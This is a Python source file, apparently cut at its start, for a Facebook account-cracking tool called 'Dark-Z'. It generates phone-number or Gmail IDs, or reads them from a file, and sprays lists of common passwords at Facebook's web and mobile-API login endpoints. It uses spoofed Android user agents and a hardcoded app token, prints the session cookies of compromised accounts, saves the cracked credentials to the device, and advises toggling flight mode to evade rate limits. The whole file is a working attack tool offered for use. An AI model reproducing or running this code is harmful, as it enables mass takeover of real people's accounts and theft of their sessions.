    'fbdv': model,
    'fbsv': fbsv,
    'fbca': fbca,
    'fbdm': fbdm}
logo = ("""

██████╗░░█████╗░██████╗░██╗░░██╗        ███████╗
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝        ╚════██║
██║░░██║███████║██████╔╝█████═╝░        ░░███╔═╝
██║░░██║██╔══██║██╔══██╗██╔═██╗░        ██╔══╝░░
██████╔╝██║░░██║██║░░██║██║░╚██╗        ███████╗
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝        ╚══════╝

\033[1;91m\033[1;41m\033[1;97m              Be you, The world will adjust               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[👨] AUTHOR    :\033[1;32m DARK X FUZED 
\033[1;32m[📖] GITHUB    :\033[1;32m CODERET-D-LOOPER
\033[1;32m[😇] FACEBOOK  :\033[1;32m FIRDAWS SAPNO
\033[1;32m[💉] TOOLS TYPE:\033[1;32m FREE
\033[1;32m[📅] VERSION   :\033[1;32m 2.0
\033[1;32m[🚀] STATUS    :\033[1;32m WORKING
\033[1;32m[⏳] UPDATE    :\033[1;32m AUTO-UPDATE [ON]
\033[1;92m══════════════════════════════════════════

\033[1;91m<═══\033[1;41m\033[1;97m WORKING ONLY ON MOBILE DATA\033[;0m\033[1;91m═══>\033[1;92m""")



def clear():
    os.system('clear')
    print(logo)


loop = 0
oks = []
cps = []
twf = []
pcp = []
id = []
tokenku = []


def menu():
    try:
        clear()
        os.system(' xdg-open https://www.github.com/coderet-d-looper')
        if 1 == 1:
            clear()
            print(
            "\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
            print('\033[1;37m[1️⃣] FILE CLONING\n\033[1;37m[2️⃣] RANDOM CLONING [NOT WORKING]\n\033[1;37m[3️⃣] VISIT MY ACCOUNT\n\033[1;37m[4️⃣] CLOSE TOOL')
            print(
            "\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
            xd = input('\033[1;37m[💥] CHOOSE : ')
            if xd in ['1', '01']:
                os.system(
                    ' xdg-open https://m.facebook.com/groups/2477016825771219/?ref=share&mibextid=NSMWBT')
                clear()
                file = input('\033[1;37m[📂] ENTER FILE PATH: ')
                try:
                    fo = open(file, 'r').read().splitlines()
                except FileNotFoundError:
                    print('[❌] FILE LOCATION NOT FOUND [❌]')
                    time.sleep(1)
                    menu()
                clear()
                print('\033[1;32m[1] METHOD 1 [BEST WORKING]\n[2] METHOD 2')
                linex()
                mthd = input('\033[1;32m[+] CHOOSE : ')
                linex()
                plist = []
                print('\033[1;37m           SELECT CRACK MENU')
                linex()
                print(
                    '[1] AUTO PASSWORD [BEST]\n[2] MANUAL PASSWORD')
                linex()
                ppp = input('\033[1;32m[+] CHOOSE : ')
                if ppp in ['1', '01']:
                    plist.append('first last')
                    plist.append('first')
                    plist.append('firstlast')
                    plist.append('first123')
                    plist.append('first1234')
                    plist.append('first12345')
                    plist.append('first123456')
                    plist.append('first1122')
                    plist.append('first@@')
                    plist.append('first@@@')
                    plist.append('first@@@@')
                    plist.append('first12')
                    plist.append('first111')
                    plist.append('first11')
                    plist.append('i love you')
                    plist.append('last')
                else:
                    try:
                        linex()
                        ps_limit = int(
                            input(' HOW MANY PASSWORD DO YOU WANT TO ADD ? '))
                    except:
                        ps_limit = 15
                    linex()
                    print('\033[1;32m EXAMPLE: first last,firtslast,first123')
                    linex()
                    for i in range(ps_limit):
                        plist.append(
                            input(f'\033[1;32m[+] PUT PASSWORD {i+1}: '))
                linex()
                print('[🍬]SHOW CP ACCOUNT? (Y/n): ')
                linex()
                cx = input(' CHOOSE: ')
                if cx in ['y', 'Y', 'yes', 'Yes', '1']:
                    pcp.append('y')
                else:
                    pcp.append('n')
                with tred(max_workers=30) as crack_submit:
                    clear()
                    total_ids = str(len(fo))
                    print('[🧮]TOTAL ID : \033[1;32m'+total_ids)
                    print("\033[1;35m[🚄]CRACKING SPEED - MEDIUM ")
                    print("\033[1;33m[🔍]CRACKING HAS BEEN STARTED")
                    linex()
                    print("""\033[1;91m\033[1;41m\033[1;97m ✈ USE FLIGHT MODE IN EVERY 5 MIN\033[;0m\033[1;91m\033[1;92m""")
                    linex()
                    for user in fo:
                        ids, names = user.split('|')
                        passlist = plist
                        if mthd in ['1', '01']:
                            crack_submit.submit(ffb, ids, names, passlist)
                        elif mthd in ['2', '02']:
                            crack_submit.submit(api, ids, names, passlist)
                        else:
                            crack_submit.submit(api1, ids, names, passlist)
                print('\033[1;37m')
                linex()
                print('[😘]CRACKING HAS COMPLETED')
                print('[🔰]Total OK/CP/2F: '+str(len(oks)) +
                      '/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                input('[👉]PRESS ENTER FOR MAIN MENU[👈]')
                os.system('python Dark.py')
            elif xd in ['3', '03']:
                os.system(' xdg-open https://www.facebook.com/coderet.d.looper')
                menu()
            elif xd in ['4', '04']:
                exit('BYE BYE Tata Gaya')
            elif xd in ['2', '02']:
                clear()
                print(
                    ' [1]Pakistan cloning\n [2] Bangladesh cloning\n [3] Indonesia Cloning\n [4] Gmail cloning\n [0] Back menu')
                linex()
                x = input(' Choose: ')
                if x in ['1', '01']:
                    pak()
                elif x in ['2', '02']:
                    bd()
                elif x in ['3', '03']:
                    indo()
                elif x in ['4', '04']:
                    gmail()
                else:
                    menu()
            elif xd in ['5', '05']:
                gmail()
            else:
                exit(' Option not found in menu...')
        else:
            print(' Run :  python Dark.py')
            linex()
            exit()
    except ValueError:
        exit()
    except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()


def pak():
    user = []
    clear()
    print('\033[1;31m Code example: 0306,0315,0335,0345')
    code = input('\033[1;37m put code: ')
    try:
        limit = int(
            input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
    except ValueError:
        limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=30) as Aking:
        clear()
        tl = str(len(user))
        print(' Total ids : \033[1;32m'+tl)
        print(f'\033[1;32m Cracking has been started')
        linex()
        print(f'\033[1;31mUSE FLIGHT MODE IN EVERY 5MIN')
        linex()
        for psx in user:
            ids = code+psx
            passlist = [psx, ids, 'Pakistan', 'khan1122',
                        'khan12345', 'khan123', 'khan123456', 'khankhan123']
            Aking.submit(rndm, ids, passlist)
    print('\033[1;37m')
    linex()
    print(' The process has completed')
    print(' Total OK/CP/2F: '+str(len(oks)) +
          '/'+str(len(cps))+'/'+str(len(twf)))
    linex()
    input(' Press enter to back ')
    os.system('python Dark.py')


def bd():
    user = []
    clear()
    print('\033[1;31m Code example: 016,017,018,019,015,013')
    code = input('\033[1;37m put code: ')
    try:
        limit = int(
            input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
    except ValueError:
        limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as Aking:
        clear()
        tl = str(len(user))
        print(' Total ids : \033[1;32m'+tl)
        print(' \033[1;32m Cracking has been started')
        print(f'\033[1;31m USE FLIGHT MODE IN EVERY 5MIN')
        linex()
        for psx in user:
            ids = code+psx
            passlist = [psx, ids, 'first7digit', 'last7digit', 'first6digit', 'last6digit', 'fullnumber', 'first8digit', 'last8digit', 'Bangladesh', 'bangladesh', 'i love you', 'iloveyou', 'free fire', 'freefire', 'pubg1234', '102030', '405060', '708090', '101010', '202020', '303030', '404040',
                        '505050', '606060', '707070', '808080', '909090', 'hacker1234', 'Sadia1234', 'Sumaiya1234', 'Mim1234', '121212', '232323', '343434', '565656', '787878', '898989', 'Bangladesh1234', 'bangladesh1234', 'freefire1234', 'Freefire1234', 'Gamer1234', 'gamer1234', 'Hacker1234', 'sadiya', 'sumaiya']
            Aking.submit(rndm, ids, passlist)
    print('\033[1;37m')
    linex()
    print(' The process has completed')
    print(' Total OK/CP/2F: '+str(len(oks)) +
          '/'+str(len(cps))+'/'+str(len(twf)))
    linex()
    input(' Press enter to back ')
    os.system('python Dark.py')


def indo():

    user = []

    clear()
    print('\033[1;31m Code example: 021,031,035,071,0411,etc')
    code = input('\033[1;37m put code: ')
    try:
        limit = int(
            input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
    except ValueError:
        limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as Aking:
        clear()
        tl = str(len(user))
        print(' Total account : \033[1;32m'+tl)
        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
        linex()
        print(f'\033[1;31m USE FLIGHT MODE IN EVERY 5MIN')
        linex()
        for psx in user:
            ids = code+psx

            passlist = [psx, psx[1:], "indonesia",
                        ids, 'free fire', 'freefire']

            Aking.submit(rndm, ids, passlist)
    print('\033[1;37m')
    linex()
    print(' The process has completed')
    print(' Total OK/CP/2F: '+str(len(oks)) +
          '/'+str(len(cps))+'/'+str(len(twf)))
    linex()
    input(' Press enter to back ')
    os.system('python Dark.py')


def gmail():
    os.system('rm -rf .re.txt')
    clear()
    print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
    linex()
    first = input(' Put first name: ')
    linex()
    print('\033[1;37m example: khan, awais, ali \033[1;97m')
    linex()
    last = input(' Put last name: ')
    linex()
    print(' Example: @gmail.com , @yahoo.com etc...')
    linex()
    domain = input(' domain: ')
    linex()
    try:
        limit = int(input(' Put limit: '))
    except ValueError:
        limit = 5000
    linex()
    print(' Getting gmails...')
    lists = ['3', '4']
    for xd in range(limit):
        lchoice = random.choice(lists)
        if '3' in lchoice:
            mail = ''.join(random.choice(string.digits) for _ in range(3))
            open('.re.txt', 'a').write(first.lower() +
                                       last.lower()+mail+domain+'|'+first+' '+last+'\n')
        else:
            mail = ''.join(random.choice(string.digits) for _ in range(4))
            open('.re.txt', 'a').write(first.lower() +
                                       last.lower()+mail+domain+'|'+first+' '+last+'\n')
        fo = open('.re.txt', 'r').read().splitlines()
    with tred(max_workers=30) as Aking:
        total = str(len(fo))
        clear()
        print(' Total ids : \033[1;32m'+total)
        print("\033[1;32m Cracking has been Started")
        linex()
        print(f'\033[1;37mUSE FLIGHT MODE IN EVERY 5MIN')
        linex()
        for user in fo:
            ids, names = user.split('|')
            first_name = names.rsplit(' ')[0]
            try:
                last_name = names.rsplit(' ')[1]
            except IndexError:
                last_name = 'Khan'
            fs = first_name.lower()
            ls = last_name.lower()
            passlist = [fs+ls, fs+' '+ls, fs+'123', fs+'12345',
                        fs+'1122', fs, fs+'1234', fs+'786', fs+'12']
            Aking.submit(rndm, ids, passlist)
    print('\033[1;37m')
    linex()
    print(' The process has completed')
    print(' Total OK/CP/2F: '+str(len(oks)) +
          '/'+str(len(cps))+'/'+str(len(twf)))
    linex()
    input(' Press enter to back ')
    os.system('python Dark.py')


def ffb(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write(
        '\r\r\033[1;37m[Dark-Z] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
    sys.stdout.flush()
    session = requests.Session()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace(
                'Last', last).replace('first', ps).replace('last', ps2)
            ua = random.choice(ugen)
            head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            getlog = session.get(
                f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            idpass = {"lsd": re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', str(
                getlog.text)).group(1), "uid": ids, "next": "https://free.facebook.com/login/save-device/", "flow": "login_no_pin", "pass": pas, }
            complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',
                                    data=idpass, allow_redirects=False, headers=head)
            Aking = session.cookies.get_dict().keys()
            if "c_user" in Aking:
                print("")
                print('\r\r\033[1;37m[Dark-OK] %s | %s' % (ids, pas))
                print('[🌺]=COOKIES ⬇')
                cookies = ""
                for k,v in session.cookies.items():
                    cookies += str(k) + "=" + str(v) + ";"
                print('\r\r\033[1;32m %s' % cookies)
                open('/sdcard/Dark-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in Aking:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m[Dark-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop += 1


def api(ids, names, passlist):
    try:
        global oks, loop, sim_id, device
        sys.stdout.write(
            '\r\r\033[1;37m[Dark-Z] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
        sys.stdout.flush()

        fn = names.split(' ')[0]

        try:
            ln = names.split(' ')[1]
        except:
            ln = fn

        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower(
            )).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(
                random.randint(000000000, 999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join(random.choice(string.digits) for _ in range(2))
            jazoest = li2+j1
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                'generate_analytics_claims': '1',
                'community_id': '',
                "sim_country": "id",
                'try_num': '1',
                'family_device_id': family,
                'sim_serials': sim_serials,
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'logged_out_id': str(uuid.uuid4()),
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'tier': 'regular',
                'reg_instance': str(uuid.uuid4()),
                'meta_inf_fbmeta': '',
                'currently_logged_in_userid': '0',
                'locale': fblc,
                'client_country_code': '',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            }
            headers = {
                'Authorization': f'OAuth {accessToken}',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Bandwidth': str(random.randint(2e7, 3e7)),
                'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS' + \
                ' shortly with '+'a code to use'+' for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                print("")
                print('\r\r\033[1;37m[Dark-OK] '+ids+' | '+pas+'\033[1;97m')
                print('[🌺]=COOKIES ⬇')
                cookies = ""
                for k,v in po.cookies.items():
                    cookies += str(k) + "=" + str(v) + ";"
                print('\r\r\033[1;32m %s' % cookies)
                open('/sdcard/Dark-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                if 'y' in pcp:
                    print("")
                    print('\r\r \033[1;34m[Dark-2F] '+ids+' | '+pas)
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po['error']['message']:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m[Dark-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
                else:
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
            else:
                continue
        loop += 1
    except Exception as e:
        pass


def api1(ids, names, passlist):
    try:
        global oks, loop, sim_id
        sys.stdout.write(
            '\r\r\033[1;37m[Dark-Z] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower(
            )).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(
                random.randint(000000000, 999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join(random.choice(string.digits) for _ in range(2))
            jazoest = li2+j1
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                "session_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                "reg_instance": str(uuid.uuid4()),
                "logged_out_id": str(uuid.uuid4()),
                "hash_id": str(uuid.uuid4()),
                "sim_country": "id",
                "network_country": "id",
                "enroll_misauth": "false",
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                "cpl": "true",
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'meta_inf_fbmeta': '',
                'currently_logged_in_userid': '0',
                'fb_api_req_friendly_name': 'authenticate',
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            }
            headers = {
                'Authorization': f'OAuth {accessToken}',
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Type': 'unknown',
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-api.facebook.com/method/auth.login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS' + \
                ' shortly with '+'a code to use'+' for log in'
            po = requests.post(url, data=data, headers=headers).json()

            if 'session_key' in po:
                print("")
                print('\r\r\033[1;37m[Dark-OK] '+ids+' | '+pas+'\033[1;97m')
                print('[🌺]=COOKIES ⬇')
                cookies = ""
                for k,v in po.cookies.items():
                    cookies += str(k) + "=" + str(v) + ";"
                print('\r\r\033[1;32m %s' % cookies)
                open('/sdcard/Dark-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                if 'y' in pcp:
                    print("")
                    print('\r\r \033[1;34m[Dark-2F] '+ids+' | '+pas)
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po['error_msg']:
                if 'y' in pcp:
                    print('\r\r\x1b[38;5;208m[Dark-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
                else:
                    open('/sdcard/Dark-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    break
                    cps.append(ids)
            else:
                continue
        loop += 1
    except Exception as e:
        pass


def rndm(ids, passlist):
    global loop
    global oks
    sys.stdout.write(
        '\r\r\033[1;37m[Dark-Z] %s|\033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
    sys.stdout.flush()
    try:
        for pas in passlist:
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(
                random.randint(000000000, 999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            li = ['28', '29', '210']
            li2 = random.choice(li)
            j1 = ''.join(random.choice(string.digits) for _ in range(2))
            jazoest = li2+j1
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                "logged_out_id": str(uuid.uuid4()),
                "hash_id": str(uuid.uuid4()),
                "reg_instance": str(uuid.uuid4()),
                "session_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                "sim_country": "id",
                "network_country": "id",
                "relative_url": "method/auth.login",
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'fb_api_req_friendly_name': 'authenticate',
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            }
            headers = {
                'Authorization': f'OAuth {accessToken}',
                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Type': 'unknown',
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS' + \
                ' shortly with '+'a code to use'+' for log in'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                try:
                    uid = po['uid']
                except:
                    uid = ids
                if str(uid) in oks:
                    break
                else:
                    print("")
                    print('\r\r\033[1;37m[Dark-OK] ' +
                          str(uid)+' | '+pas+'\033[1;97m')
                    print('[🌺]=COOKIES ⬇')
                    cookies = ""
                    for k,v in po.cookies.items():
                        cookies += str(k) + "=" + str(v) + ";"
                    print('\r\r\033[1;32m %s' % cookies)
                    open('/sdcard/Dark-OK.txt', 'a').write(str(uid)+'|'+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in po['error']['message']:
                try:
                    uid = po['error']['error_data']['uid']
                except:
                    uid = ids
                if uid in oks:
                    pass
                else:
                    print('\r\r\x1b[38;5;208m[Dark-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/Dark-CP.txt', 'a').write(str(uid)+'|'+pas+'\n')
                    cps.append(str(ids))
                    break
            else:
                continue
        loop += 1
    except Exception as e:
        pass


try:

    menu()
except requests.exceptions.ConnectionError:
    print('\n No internet connection ...')
    exit()
except Exception as e:
    print(e)
